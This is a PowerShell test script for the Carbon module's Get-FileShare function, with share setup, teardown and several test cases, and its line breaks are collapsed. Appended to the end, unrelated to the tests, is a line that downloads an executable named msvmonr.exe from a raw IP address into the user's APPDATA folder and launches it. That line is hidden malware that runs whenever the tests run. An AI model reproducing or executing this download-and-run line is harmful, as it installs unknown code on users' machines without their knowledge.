& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)$shareName = 'CarbonGetFileShare'$sharePath = $null$shareDescription = 'Share for testing Carbon''s Get-FileShare function.'function Start-TestFixture{$sharePath = New-TempDirectory -Prefix $PSCommandPathInstall-SmbShare -Path $sharePath -Name $shareName -Description $shareDescription}function Stop-TestFixture{$share = Get-WmiObject 'Win32_Share' -Filter "Name='$shareName'"if( $share -ne $null ){[void] $share.Delete()}Remove-Item -Path $sharePath}function Test-ShouldGetPermissions{$shares = Get-FileShareAssert-NotNull $shares $carbonShare = $shares | Where-Object { $_.Name -eq $shareName }}function Test-ShouldGetSpecificShare{$carbonShare = Get-FileShare -Name $shareNameAssert-CarbonShare $carbonShare}function Test-ShouldGetOnlyFileShares{$nonFileShares = Get-WmiObject -Class 'Win32_Share' | Where-Object { $_.Type -ne 0 -and $_.Type -ne 2147483648 }if( $nonFileShares ){foreach( $nonFileShare in $nonFileShares ){$share = Get-FileShare | Where-Object { $_.Name -eq $nonFileShare.Name }Assert-Null $share}}else{Write-Warning ('No non-file shares on this computer.')}}function Test-ShouldAcceptWildcards{$carbonShare = Get-FileShare 'CarbonGetFile*'Assert-CarbonShare $carbonShare}function Test-ShouldWriteErrorWhenShareNotFound{$share = Get-FileShare -Name 'fjdksdfjsdklfjsd' -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'not found'Assert-Null $share}function Test-ShouldNotWriteErrorIfNoWildcardMatches{$carbonShare = Get-FileShare 'fjdskfsdf*'Assert-NoError Assert-Null $carbonShare}function Test-ShouldIgnoreErrors{Get-FileShare -Name 'fhsdfsdfhsdfsdaf' -ErrorAction IgnoreAssert-NoError}function Assert-CarbonShare{param($Share)Assert-NotNull $ShareAssert-Equal $shareDescription $Share.DescriptionAssert-Equal $sharePath.FullName $Share.Path}(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")